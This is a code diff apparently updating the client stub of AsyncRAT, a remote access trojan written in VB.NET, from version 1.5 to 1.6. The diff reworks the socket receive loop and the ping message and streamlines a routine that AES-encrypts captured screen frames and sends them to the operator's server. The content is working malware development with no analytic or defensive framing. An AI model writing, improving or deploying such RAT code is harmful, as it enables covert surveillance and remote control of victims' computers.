@@ -57,7 +57,7 @@ Namespace AsyncRAT_Stub
         Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({%PORT%})
         Public Shared ReadOnly KEY As String = "%KEY%"
 #End If
-        Public Shared ReadOnly VER As String = "v1.5"
+        Public Shared ReadOnly VER As String = "v1.6"
         Public Shared ReadOnly SPL As String = "<<Async|RAT>>"
     End Class
 
@@ -67,6 +67,7 @@ Namespace AsyncRAT_Stub
         Public Shared isConnected As Boolean = False
         Public Shared S As Socket = Nothing
         Public Shared BufferLength As Long = Nothing
+        Public Shared BufferLengthReceived As Boolean = False
         Public Shared Buffer() As Byte
         Public Shared MS As MemoryStream = Nothing
         Public Shared ReadOnly SPL = Settings.SPL
@@ -97,7 +98,7 @@ Namespace AsyncRAT_Stub
 
                 S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
 
-                BufferLength = -1
+                BufferLength = 0
                 Buffer = New Byte(0) {}
                 MS = New MemoryStream
 
@@ -108,7 +109,6 @@ Namespace AsyncRAT_Stub
                 Debug.WriteLine("Connect : Connected")
 
                 isConnected = True
-                allDone.Set()
                 Send(Info)
 
                 S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
@@ -118,6 +118,7 @@ Namespace AsyncRAT_Stub
             Catch ex As Exception
                 Debug.WriteLine("Connect : Failed")
                 isConnected = False
+            Finally
                 allDone.Set()
             End Try
         End Sub
@@ -140,7 +141,7 @@ Namespace AsyncRAT_Stub
             Try
                 Dim Received As Integer = S.EndReceive(ar)
                 If Received > 0 Then
-                    If BufferLength = -1 Then
+                    If BufferLengthReceived = False Then
                         If Buffer(0) = 0 Then
                             Debug.WriteLine("BeginReceive : Got BufferLength")
                             BufferLength = BS(MS.ToArray)
@@ -149,11 +150,10 @@ Namespace AsyncRAT_Stub
 
                             If BufferLength = 0 Then
                                 Debug.WriteLine("BeginReceive : Got BufferLength : isNothing")
-                                BufferLength = -1
-                                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
-                                Exit Sub
+                            Else
+                                Buffer = New Byte(BufferLength - 1) {}
+                                BufferLengthReceived = True
                             End If
-                            Buffer = New Byte(BufferLength - 1) {}
                         Else
                             Debug.WriteLine("BeginReceive : Seeking BufferLength")
                             MS.WriteByte(Buffer(0))
@@ -162,12 +162,12 @@ Namespace AsyncRAT_Stub
                         MS.Write(Buffer, 0, Received)
                         If (MS.Length = BufferLength) Then
                             Debug.WriteLine("BeginReceive : Received Full Packet")
-                            Dim T As New Thread(New ParameterizedThreadStart(AddressOf Messages.Read))
-                            T.Start(MS.ToArray)
-                            BufferLength = -1
+                            Buffer = New Byte(0) {}
+                            BufferLength = 0
+                            ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf Messages.Read), MS.ToArray)
                             MS.Dispose()
                             MS = New MemoryStream
-                            Buffer = New Byte(0) {}
+                            BufferLengthReceived = False
                         Else
                             Buffer = New Byte(BufferLength - MS.Length - 1) {}
                             Debug.WriteLine("BeginReceive : Received Full Packet : NotEqual")
@@ -254,26 +254,12 @@ Namespace AsyncRAT_Stub
         Public Shared Sub Ping()
             Try
                 If isConnected = True Then
-                    Using MS As New MemoryStream
-                        Dim B As Byte() = AES_Encryptor(SB("PING?"))
-                        Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
-
-                        MS.Write(L, 0, L.Length)
-                        MS.Write(B, 0, B.Length)
-
-                        S.Poll(-1, SelectMode.SelectWrite)
-                        S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
-                        Console.WriteLine("Ping : Sent")
-                    End Using
+                    Send("PING?!")
                 End If
             Catch ex As Exception
-                Console.WriteLine("Ping : Failed")
-                isConnected = False
             End Try
         End Sub
-
     End Class
-
 
     Public Class Messages
         Private Shared ReadOnly SPL = Program.SPL
@@ -415,28 +401,25 @@ Namespace AsyncRAT_Stub
 
                 Try
                     SyncLock Program.S
+                        Dim Bb As Byte() = AES_Encryptor(SB(("RD+" + Program.SPL + BS(MS.ToArray))))
+                        Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))
                         Using MEM As New IO.MemoryStream
-                            Dim Bb As Byte() = AES_Encryptor(SB(("RD+" + Program.SPL + BS(MS.ToArray))))
-                            Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))
-
                             MEM.Write(L, 0, L.Length)
                             MEM.Write(Bb, 0, Bb.Length)
-
                             Program.S.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
                             Program.S.Send(MEM.ToArray, 0, MEM.Length, Net.Sockets.SocketFlags.None)
                         End Using
+
                     End SyncLock
                 Catch ex As Exception
                     Program.isConnected = False
                 End Try
 
-                Try
-                    g.Dispose()
-                    g2.Dispose()
-                    B.Dispose()
-                    MS.Dispose()
-                Catch ex As Exception
-                End Try
+                Try : MS.Dispose() : Catch : End Try
+                Try : g.Dispose() : Catch : End Try
+                Try : g2.Dispose() : Catch : End Try
+                Try : Resize.Dispose() : Catch : End Try
+                Try : B.Dispose() : Catch : End Try
 
             Catch ex As Exception
             End Try
